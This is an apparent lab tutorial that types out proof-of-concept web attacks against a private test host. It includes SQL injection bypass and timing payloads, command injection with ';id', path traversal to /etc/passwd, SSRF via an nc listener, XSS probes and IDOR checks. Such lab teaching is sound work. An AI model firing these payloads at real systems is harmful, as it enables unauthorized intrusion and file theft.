# Web Application Attacks - Typing

This lesson types proof-of-concept requests against the lab web application
at http://10.10.20.5. Every request is saved as evidence with the command
that produced it.

## Set up the engagement folder

Keep the web test separate from the network scan.

```bash
# make a web evidence folder
mkdir -p exploit/web

# record the target
echo "http://10.10.20.5" > exploit/web/target.txt
```

## Content discovery

Push a wordlist at the server to find every reachable path.

```bash
# create a small wordlist
cat > exploit/web/wordlist.txt <<'EOF'
admin
api
backup
config
download
login
search
upload
EOF

# fuzz paths with ffuf
ffuf -u http://10.10.20.5/FUZZ -w exploit/web/wordlist.txt -mc 200,301,302,401,403
```

The status codes mark which paths exist.

## Inspect the found paths

A protected path is as interesting as an open one.

```bash
# save the login page
curl -s http://10.10.20.5/login -o exploit/web/login.html

# read the page's form fields
grep -oiE '<(input|form)[^>]*>' exploit/web/login.html
```

The form fields name the parameters the application expects.

## Test SQL injection in a login form

Prove the injection with the least destructive request.

```bash
# submit a classic login bypass payload
curl -s -X POST http://10.10.20.5/login \
    -d "username=admin' OR '1'='1&password=x" \
    -o exploit/web/sqli-login.html

# check whether the application granted access
grep -oiE '(welcome|dashboard|admin|error)' exploit/web/sqli-login.html
```

The response content tells whether the payload changed the query result.

## Confirm with an error probe

An error response confirms the input reached the SQL parser.

```bash
# inject a single quote to provoke a syntax error
curl -s http://10.10.20.5/item?id=1%27 -o exploit/web/sqli-error.html

# look for a database error message
grep -oiE '(sql|syntax|mysql|postgres|error)' exploit/web/sqli-error.html
```

A database error in the response is direct evidence of injection.

## Test blind injection with timing

When the page never reflects data, timing proves the query executes.

```bash
# baseline request time
time curl -s -o /dev/null "http://10.10.20.5/item?id=1"

# sleep payload inside the query
time curl -s -o /dev/null \
    "http://10.10.20.5/item?id=1%20AND%20SLEEP(3)"
```

A multi-second delay after the sleep payload is the proof.

## Test for cross-site scripting

Find input the page echoes, then prove it is not encoded.

```bash
# submit a marker string as the search value
curl -s "http://10.10.20.5/search?q=marker-abc-123" \
    -o exploit/web/xss-echo.html

# check whether the marker appears raw in the response
grep -c "marker-abc-123" exploit/web/xss-echo.html

# submit an HTML tag as the marker
curl -s "http://10.10.20.5/search?q=<b>marker</b>" \
    -o exploit/web/xss-html.html

# confirm the tag survived unencoded
grep -o "<b>marker</b>" exploit/web/xss-html.html
```

An unencoded echoed tag is a reflected XSS proof.

## Test for command injection

Find an endpoint that runs a system command, then append a proof command.

```bash
# baseline: the application's own command
curl -s "http://10.10.20.5/ping?host=10.10.20.5" -o exploit/web/cmd-base.txt

# append a shell separator and a proof command
curl -s "http://10.10.20.5/ping?host=10.10.20.5;id" \
    -o exploit/web/cmd-inject.txt

# look for the injected command's output
grep -oE 'uid=[0-9]+' exploit/web/cmd-inject.txt
```

Command output in the response is a shell-level finding.

## Test for SSRF

Point a server-fetch feature at a target only the server can reach.

```bash
# start a listener on the attacker box
nc -l -p 9000 > exploit/web/ssrf-callback.txt &

# ask the application to fetch the listener address
curl -s -X POST http://10.10.20.5/fetch \
    -d "url=http://10.10.20.25:9000/probe"

# check whether the server connected back
sleep 2
cat exploit/web/ssrf-callback.txt
```

A connection back to the listener proves the server performed the request.

## Test for path traversal

Climb out of the served directory to reach system files.

```bash
# baseline request for a normal file
curl -s "http://10.10.20.5/download?file=report.pdf" \
    -o exploit/web/trav-base.txt

# traverse to the password file
curl -s "http://10.10.20.5/download?file=../../../../etc/passwd" \
    -o exploit/web/trav-passwd.txt

# confirm the file content came back
grep -E "root:.*:0:0:" exploit/web/trav-passwd.txt
```

The passwd format in the response is definitive proof.

## Test broken access control

Change a resource identifier and check whether ownership is enforced.

```bash
# request an object as an unauthenticated user
curl -s -o /dev/null -w '%{http_code}\n' "http://10.10.20.5/order/1"

# request a different object's identifier
curl -s -o /dev/null -w '%{http_code}\n' "http://10.10.20.5/order/2"

# request a resource owned by another principal
curl -s -b "session=lab-user-1" "http://10.10.20.5/order/42" \
    -o exploit/web/idor-42.html

# confirm the returned content
head -n 5 exploit/web/idor-42.html
```

Returned data for another principal's identifier is an access-control finding.

## Fuzz parameters

Hidden parameters expand the application's input surface.

```bash
# create a parameter wordlist
cat > exploit/web/params.txt <<'EOF'
admin
backup
debug
file
id
page
path
url
user
EOF

# fuzz query parameters against a known endpoint
ffuf -u "http://10.10.20.5/item?FUZZ=1" \
    -w exploit/web/params.txt -fs 0
```

A parameter that changes the response is a new attack surface.

## Check HTTP methods

An endpoint may accept methods the interface never uses.

```bash
# ask the server which methods it advertises
curl -s -X OPTIONS -i http://10.10.20.5/upload | grep -i '^allow:'

# try a PUT against an upload endpoint
curl -s -X PUT -d "proof" http://10.10.20.5/upload/proof.txt \
    -o /dev/null -w '%{http_code}\n'

# confirm the uploaded file is served
curl -s http://10.10.20.5/upload/proof.txt
```

A writable PUT endpoint is a direct file-upload finding.

## Save full request evidence

A finding is stronger with the exact request captured.

```bash
# capture headers and body with a single command
curl -s -i "http://10.10.20.5/item?id=1%27" \
    -o exploit/web/sqli-error-full.txt

# show the evidence file
cat exploit/web/sqli-error-full.txt
```

The saved request is reproducible in the report.

## Review the evidence

Every proof should be reproducible from the saved output.

```bash
# list the collected evidence
find exploit/web -type f | sort

# summarize which checks produced findings
grep -l "marker" exploit/web/xss-html.html
grep -l "uid=" exploit/web/cmd-inject.txt
grep -l "root:" exploit/web/trav-passwd.txt
```

## Wrap up

Web attack sequence: content discovery -> parameters -> injection proofs ->
access-control checks -> saved evidence.
